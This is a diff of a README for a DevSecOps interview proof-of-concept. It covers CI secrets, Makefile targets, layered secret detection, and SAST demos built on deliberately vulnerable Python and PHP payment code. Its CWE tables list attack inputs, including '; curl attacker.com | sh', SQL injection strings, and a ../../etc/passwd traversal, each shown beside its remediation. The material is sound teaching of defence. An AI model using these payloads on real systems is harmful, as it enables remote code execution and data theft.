@@ -96,36 +96,62 @@ export KIND_EXPERIMENTAL_PROVIDER=podman
 
 ---
 
-## GitHub Actions — enabling the CI pipeline
+## GitHub Actions — secrets and pipeline setup
 
-The workflows in `.github/workflows/` are already written. To make them run:
+### Required secrets
 
-1. **Add `SNYK_TOKEN` secret** — GitHub repo → Settings → Secrets and variables → Actions → New repository secret
-   - Get a free token at [snyk.io](https://snyk.io) → Account Settings → API Token
+GitHub repo → **Settings → Secrets and variables → Actions → New repository secret**
 
-2. **Enable GHCR** — the `GITHUB_TOKEN` already has `packages: write` in the workflow, so image pushes work automatically on push to `master`
+| Secret | Required | Where to get it | Used by |
+|---|---|---|---|
+| `SNYK_TOKEN` | **Yes — add this** | [snyk.io](https://snyk.io) → Account Settings → API Token (free tier) | `ci.yaml` — Snyk IaC + DeepCode SAST job |
+| `GITHUB_TOKEN` | Auto-provided | GitHub injects this automatically — no setup needed | GHCR push, SARIF upload, cosign OIDC signing |
 
-3. **Enable CodeQL** — GitHub repo → Security → Code scanning → Set up → Advanced (uses the existing workflow)
+That is the complete list. Only one secret requires manual setup.
 
-4. **Trigger the pipeline** — push any commit to `master` or open a PR. Watch the pipeline at:
-   GitHub repo → Actions tab
+### Why GITHUB_TOKEN is enough for signing
 
-**What runs on every PR:**
-- Kustomize + Helm lint
-- Snyk IaC scan → results in Security tab
-- CodeQL static analysis → inline PR annotations
-- Trivy image scan → fails the build on CRITICAL/HIGH CVEs
+`GITHUB_TOKEN` is an ephemeral credential GitHub creates for each workflow run.
+The CI workflow requests exactly the permissions it needs and nothing more:
 
-**What runs on merge to master:**
-- All of the above, plus:
-- cosign keyless image signing (no keys to manage — uses GitHub OIDC)
-- syft SBOM generation + attached as image attestation
-- SLSA provenance attestation
-- Kustomize overlay image-tag bump → ArgoCD picks it up automatically
+```yaml
+permissions:
+  contents: read          # checkout the repo
+  packages: write         # push image to GHCR
+  security-events: write  # upload SARIF to GitHub Security tab
+  id-token: write         # cosign keyless signing via GitHub OIDC
+```
+
+`id-token: write` lets cosign request a short-lived OIDC token from GitHub's identity
+provider — this replaces a long-lived signing key entirely. No key to create, rotate,
+store, or leak.
+
+### Optional: GCP cloud deployment
+
+If you wire up real `terraform apply` or GKE deployment, add these:
+
+| Secret | How to get it |
+|---|---|
+| `GCP_PROJECT_ID` | GCP Console → project selector → Project ID |
+| `GCP_WORKLOAD_IDENTITY_PROVIDER` | Terraform output after provisioning a Workload Identity pool |
+
+Use Workload Identity Federation — no GCP service account JSON key files. The workflow
+proves its GitHub identity to GCP via OIDC, the same mechanism cosign uses. This is
+the `terraform/gke.tf` approach already provisioned in this repo.
+
+### One-time setup steps
+
+1. Add `SNYK_TOKEN` secret (above)
+2. Enable CodeQL — GitHub repo → Security → Code scanning → Set up → Advanced
+3. Push a commit to `master` or open a PR — the Actions tab shows the pipeline running
+
+**Every PR runs:** lint → Snyk → CodeQL → Trivy image scan (fails on CRITICAL/HIGH)
+
+**Every master merge additionally runs:** cosign sign → syft SBOM → SLSA provenance → ArgoCD image-tag bump
 
 > *"The pipeline is pinned — `snyk/actions/iac@1.1.2`, `trivy-action@0.24.0` — not `@master`.
-> Mutable action refs are a supply chain attack vector: the action could change between
-> runs. Pinning to a version means what ran yesterday runs the same way today."*
+> Mutable refs are a supply chain attack vector: the action could change between runs.
+> Pinning to a version means what ran yesterday runs the same way today."*
 
 ---
 
@@ -164,6 +190,50 @@ A full audit was run against this project. Summary of findings and resolutions:
 | KMS rotation at 90 days | Within PCI-DSS tolerance; 30 days is stricter but optional |
 | RabbitMQ default permissions `.*` | Acceptable for PoC; production would scope per queue family |
 | ArgoCD TLS disabled (`--insecure`) | Local only; production terminates TLS at ingress/mesh layer |
+
+---
+
+## Makefile — what it is and how to use it
+
+A **Makefile** is a build automation tool that groups complex multi-step commands into
+short named targets. Instead of remembering 10-flag Helm install commands and the order
+to run them in, you run `make rabbitmq` and the Makefile handles the details.
+
+For this PoC the Makefile is the primary demo interface. Every step in the walkthrough
+below maps to a single `make` target — run them in order for a full end-to-end demo,
+or pick individual targets to demonstrate specific capabilities.
+
+```bash
+make help    # list all targets with one-line descriptions
+```
+
+### Platform targets (require `make cluster` first)
+
+| Target | What it does |
+|---|---|
+| `make cluster` | Bootstrap kind cluster + deploy nginx via Kustomize AND Helm (Phases 1–2) |
+| `make watch` | Live view of HPA + pod count — open this before `load-test` |
+| `make load-test` | k6: ramp 20 → 100 → 200 VUs, triggers HPA scale-out, writes `k6-summary.json` |
+| `make argocd` | Install ArgoCD + register the GitOps Application |
+| `make prometheus` | Install Prometheus + Grafana (admin / poc-admin) |
+| `make loki` | Install Loki + Promtail log aggregation |
+| `make alert-rules` | Apply all AlertManager PrometheusRules to Grafana |
+| `make rabbitmq` | Install RabbitMQ (3-node quorum) + producer CronJob + consumer Deployment |
+| `make kyverno` | Install Kyverno + apply all five admission policies |
+| `make istio` | Install Istio + apply mTLS STRICT + AuthorizationPolicy deny-all |
+| `make falco` | Install Falco with modern eBPF driver |
+| `make terraform-plan` | Validate GCP/GKE IaC — no cloud spend, reads `example.tfvars` |
+| `make all` | Run every target above in the correct order |
+| `make destroy` | Delete the kind cluster |
+
+### Security demo targets (no cluster required)
+
+| Target | What it does |
+|---|---|
+| `make security-scan` | Trivy: secrets in source + IaC misconfigs + prod image + vuln image + SBOM grype query |
+| `make kyverno-test` | Policy unit tests — validates good pods pass and bad pods fail (no cluster) |
+| `make rbac-audit` | `kubectl auth can-i` per service account — shows least-privilege in action |
+| `make verify-supply-chain` | `cosign verify` the latest pushed image — proves it came from the pipeline |
 
 ---
 
@@ -814,18 +884,93 @@ trivy fs --scanners secret demo/insecure-code/secure_payment.py
 Open both files side-by-side. The secure version uses `os.environ["PAYMENT_GATEWAY_KEY"]`
 — the value is injected at runtime from a K8s Secret, never in source control.
 
-> *"Two independent layers caught this. GitHub Push Protection blocked the commit at the
-> terminal before it reached the remote — the repo never contained the key. Trivy secret
-> scanning in CI is the second gate for anything that slips through. This is exactly
-> what happened when building this PoC — I can show you the rejection message. The
-> credential was caught at the keyboard, not in a breach post-mortem."*
+**Defence layer 0 — pre-commit hook (caught before `git commit`):**
+
+`.pre-commit-config.yaml` adds a gitleaks and detect-secrets hook that runs on every
+`git commit`. This is the earliest possible catch — before the key is even in local
+git history:
+
+```bash
+# Install once:
+pip install pre-commit && pre-commit install
+
+# Now any commit containing a real secret pattern is blocked:
+# git commit -m "add payment config"
+# gitleaks — scan for secrets before commit..........Failed
+#   rule:    stripe-api-key
+#   file:    demo/insecure-code/vulnerable_payment.py
+#   commit:  (not yet created)
+```
+
+Three independent layers, earliest to latest:
+- **Layer 0**: pre-commit hook → blocks `git commit` before it creates a local SHA
+- **Layer 1**: GitHub Push Protection → blocks `git push` before the remote accepts it
+- **Layer 2**: Trivy secret scan in CI → fails the build if anything slips past layers 0 and 1
+
+> *"Two independent layers caught this during PoC development — I can show you the rejection
+> message. The pre-commit hook would have caught it even earlier: before the commit existed,
+> before it touched the network. Three-layer defence for a single vulnerability class is
+> what PCI-DSS Req 8 means by 'layered security' — one control failure doesn't mean a breach."*
 
 ---
 
 #### G. Dangerous functions caught by SAST (CodeQL + Snyk)
 
-Open `demo/insecure-code/vulnerable_payment.py`. Five CWEs annotated with the attack scenario
-and which tool catches it — these appear as inline PR annotations in the GitHub Security tab:
+Two files, two languages — the same vulnerability classes appear in Python and PHP because
+these are not language-specific bugs, they are pattern-level mistakes that appear wherever
+user input touches a dangerous function.
+
+**Python** — open `demo/insecure-code/vulnerable_payment.py`:
+
+CWEs annotated with the attack scenario and which tool catches it:
+
+| Function | CWE | Attack scenario | Caught by |
+|---|---|---|---|
+| `PAYMENT_GATEWAY_KEY = "..."` | CWE-798 | Key in git history + CI logs | Trivy, gitleaks, GitHub Push Protection |
+| `f"SELECT ... WHERE user_id = '{user_id}'"` | CWE-89 SQL injection | `' OR '1'='1'` dumps all card data | CodeQL, Snyk |
+| `os.system(f"...{report_name}")` | CWE-78 Command injection | `report; curl attacker.com \| sh` | CodeQL, Snyk |
+| `hashlib.md5(card_number.encode())` | CWE-327 Broken crypto | MD5 collisions — PCI-DSS Req 3.4 fail | Snyk DeepCode |
+| `pickle.loads(session_blob)` | CWE-502 Unsafe deserialisation | Craft payload → arbitrary code on load | Snyk, CodeQL |
+
+**PHP** — open `demo/insecure-code/vulnerable_payment.php`:
+
+| Function | CWE | Attack scenario | Caught by |
+|---|---|---|---|
+| `$db_password = 'P@ymentDB...'` | CWE-798 | Credential in source / git history | Trivy, gitleaks |
+| `mysql_query("... " . $_GET['id'])` | CWE-89 SQL injection | `1 OR 1=1` dumps all payment rows | CodeQL, Snyk |
+| `echo $_GET['status']` | CWE-79 XSS | `<script>` tag steals session cookie | CodeQL, Snyk, **OWASP ZAP** |
+| `exec("generate_receipt.sh " . $amount)` | CWE-78 Command injection | `100; curl attacker.com \| sh` | CodeQL, Snyk |
+| `include('/templates/' . $_GET['template'])` | CWE-22 Path traversal | `../../etc/passwd` discloses server files | CodeQL, Snyk |
+| `md5($card_number)` | CWE-327 Broken crypto | MD5 collision — PCI-DSS Req 3.4 fail | Snyk DeepCode |
+
+Note the extra column for PHP — **OWASP ZAP DAST** catches CWE-79 (XSS) in the HTTP
+response at runtime, which static scanners cannot. That's why SAST + DAST are both needed.
+
+Now open the secure versions (`secure_payment.py` / `secure_payment.php`) and walk the fixes:
+
+```python
+# Python fixes:
+cursor.execute("SELECT ... WHERE user_id = ?", (user_id,))    # parameterised query
+subprocess.run(["script.sh", name], shell=False)               # list args, no shell
+hashlib.pbkdf2_hmac("sha256", card.encode(), salt, 600_000)   # PBKDF2 with salt
+json.loads(session_blob)                                        # no code execution surface
+```
+
+```php
+// PHP fixes:
+$stmt = $pdo->prepare('SELECT ... WHERE id = :id');            // PDO prepared statement
+$status = htmlspecialchars($_GET['status'], ENT_QUOTES, 'UTF-8'); // output encoding
+$safe = escapeshellarg($amount);                               // shell-safe wrapping
+$path = $allowed[$name];  include $path;                       // allowlist, not user path
+hash_hmac('sha256', $card_number, getenv('CARD_HASH_KEY'));    // HMAC-SHA256
+```
+
+> *"Same five bug classes, two different languages — this is intentional. The patterns
+> (injection, deserialisation, weak crypto, hardcoded secrets) appear wherever developers
+> stop thinking about data as potentially hostile. SAST is language-aware — CodeQL has
+> separate query suites for Python and PHP — so it catches the same logical flaw expressed
+> differently. The ZAP DAST result for the PHP XSS is the one no static scanner sees:
+> it requires a running application returning a real HTTP response."*
 
 | Function | CWE | Attack scenario | Caught by |
 |---|---|---|---|
@@ -955,8 +1100,8 @@ Every JD requirement maps to specific files in this repo. Open the file directly
 | DAST | Step 14 | `.github/workflows/dast.yaml`, `.zap/rules.tsv` (rule overrides with rationale) |
 | Automated dependency updates | — | `.github/dependabot.yml` (weekly PRs: Actions + Docker + pip + Terraform + npm) |
 | Vulnerability disclosure | — | `SECURITY.md` (private disclosure via GitHub Security Advisories) |
-| SAST — dangerous functions / insecure code | Steps 5, 16G | `demo/insecure-code/vulnerable_payment.py` (CWE-89/78/327/502/798 annotated), `demo/insecure-code/secure_payment.py` (remediations), `.github/workflows/ci.yaml` — `codeql` job |
-| Secret detection in source | Step 16F | `demo/insecure-code/vulnerable_payment.py` (hardcoded key), `make security-scan` — Trivy FS secret scan |
+| SAST — dangerous functions (Python + PHP) | Steps 5, 16G | `demo/insecure-code/vulnerable_payment.py` + `vulnerable_payment.php` (CWE-89/78/79/22/327/502/798), `demo/insecure-code/secure_payment.py` + `secure_payment.php` (remediations) |
+| Secret detection — three-layer defence | Step 16F | `.pre-commit-config.yaml` (gitleaks Layer 0), GitHub Push Protection (Layer 1, demonstrated live), `make security-scan` Trivy FS (Layer 2) |
 | Policy unit testing | Step 16H | `kyverno/tests/unit-test.yaml`, `kyverno/tests/resources.yaml`, `make kyverno-test` |
 | RBAC least-privilege audit | — | `k8s/rbac/rbac.yaml`, `make rbac-audit` (`kubectl auth can-i` for each service account) |
 | Supply chain signature verification | Step 12, 16B | `make verify-supply-chain` (cosign verify + jq proof), `kyverno/policies/verify-images.yaml` |
@@ -1158,3 +1303,69 @@ This PoC demonstrates the same pattern:
 | WAF | Web Application Firewall |
 | YAML | YAML Ain't Markup Language |
 | ZAP | Zed Attack Proxy (OWASP DAST tool) |
+
+---
+
+## Are we done? Honest completion checklist
+
+### What is fully implemented ✅
+
+| Area | Evidence |
+|---|---|
+| Container orchestration | `kind-config.yaml`, `k8s/base/`, `k8s/overlays/` |
+| Kustomize base + overlays | `k8s/base/kustomization.yaml`, `k8s/overlays/dev/`, `k8s/overlays/prod/` |
+| Helm — authored chart + consumed | `charts/nginx-app/`, all platform installs via Helm |
+| GitOps (ArgoCD) | `argocd/application.yaml` — prune + selfHeal |
+| GitHub Actions CI/CD | `.github/workflows/ci.yaml`, `dast.yaml`, `supply-chain.yaml` |
+| Google Cloud Build | `cloudbuild.yaml` |
+| SAST | CodeQL + Snyk DeepCode, Python + PHP demo code |
+| SCA | Snyk + Trivy (CVE + licence scanning) |
+| DAST | OWASP ZAP (`.github/workflows/dast.yaml`, `.zap/rules.tsv`) |
+| IaC scanning | Trivy misconfig + Snyk IaC (Terraform + K8s manifests) |
+| Secret detection | Trivy FS, GitHub Push Protection, pre-commit gitleaks (`.pre-commit-config.yaml`) |
+| Supply chain integrity | cosign keyless, syft SBOM (SPDX + CycloneDX), SLSA provenance |
+| Admission gates (two-layer) | Kyverno ClusterPolicies + Pod Security Standards |
+| Kyverno policy unit tests | `kyverno/tests/unit-test.yaml` — 6 assertions, no cluster needed |
+| Image signature admission | `kyverno/policies/verify-images.yaml` |
+| Runtime security | Falco modern\_ebpf (`make falco`) |
+| Service mesh / mTLS | `istio/peer-authentication.yaml` (STRICT), `istio/authorization-policy.yaml` |
+| Network segmentation | `k8s/base/networkpolicy.yaml`, `k8s/rabbitmq/networkpolicy.yaml` |
+| RBAC | `k8s/rbac/rbac.yaml`, `make rbac-audit` |
+| Observability | Prometheus + Grafana + Loki + Promtail + AlertManager |
+| Alerting | `monitoring/alert-rules.yaml` — 7 PrometheusRules |
+| HPA autoscaling | `k8s/base/hpa.yaml` + k6 load test demo |
+| PodDisruptionBudget | `k8s/base/pdb.yaml`, `k8s/rabbitmq/pdb.yaml` |
+| Async payment flow | `k8s/rabbitmq/` — 3-node quorum, DLQ, delivery\_mode=2, ACK |
+| Terraform (GCP/GKE) | `terraform/` — private cluster, VPC, Cloud Armor WAF, KMS, Binary Authorization |
+| Local dev | `Tiltfile`, `.devcontainer/devcontainer.json`, GitHub Codespaces |
+| PCI-DSS mapping | `docs/pci-dss-mapping.md` |
+| Framework alignment | NIST CSF, ISO 27001, CE+, DSOMM, DoD DevSecOps |
+| A/B attack demos | `demo/` — vulnerable images, unsigned deploy, insecure Python + PHP |
+| Automated dependency updates | `.github/dependabot.yml` |
+| Vulnerability disclosure | `SECURITY.md` |
+| Acronym appendix | Above |
+
+### Honest gaps vs. a live production deployment
+
+These are not gaps in the PoC — they are honest answers to "what would you add next?"
+in an interview, which is better than pretending everything is complete.
+
+| Gap | Why it matters | How to close it |
+|---|---|---|
+| **External Secrets Operator or HashiCorp Vault** | K8s Secrets are base64-encoded, not encrypted at rest without KMS. In production, secrets should be fetched from Vault/AWS SM at pod start time | Add ESO + Vault or AWS Secrets Manager |
+| **Third-party penetration test** | PCI-DSS Req 11 explicitly requires external pen testing by a QSA. Automated scanning is not a substitute | Engage an accredited QSA firm |
+| **kube-bench (CIS Kubernetes Benchmark)** | CIS benchmarks check control-plane and node configuration settings that Kyverno and PSS don't cover | Add `kube-bench` as a Kubernetes Job in CI |
+| **OpenSSF Scorecard** | Scores the repo's supply chain health (branch protection, code review, pinned dependencies) and publishes a badge | Add `scorecard.yml` GitHub Action |
+| **Live GCP deployment** | `terraform plan` is validated but never applied — Binary Authorization, Cloud Armor, and Workload Identity are not exercised against a real cluster | Apply against a real GCP project (adds cost) |
+
+### What sets this apart from a typical DevOps PoC
+
+Most interview PoCs show one or two of these. This one shows all of them:
+
+1. **Supply chain end-to-end** — not just building an image but signing it, generating an SBOM, attaching SLSA provenance, and blocking unsigned images at admission time with Kyverno
+2. **Two independent admission gates** — PSS at the API server (no webhook) and Kyverno (admission webhook) — one misconfiguration doesn't mean a policy bypass
+3. **Policy unit tests** — Kyverno policies are tested before deployment, same as application code
+4. **Runtime detection** — Falco eBPF catches behaviour that admission policies cannot (post-compromise activity inside a running container)
+5. **SAST in two languages** — Python and PHP vulnerability demos with CWE annotations, showing the same bug classes in different runtimes
+6. **Three-layer secret defence** — pre-commit hook → GitHub Push Protection → Trivy CI scan (demonstrated live during development)
+7. **Framework-mapped controls** — every control maps to NIST CSF, ISO 27001 Annex A, UK Cyber Essentials Plus, OWASP DSOMM, and DoD DevSecOps Reference Design
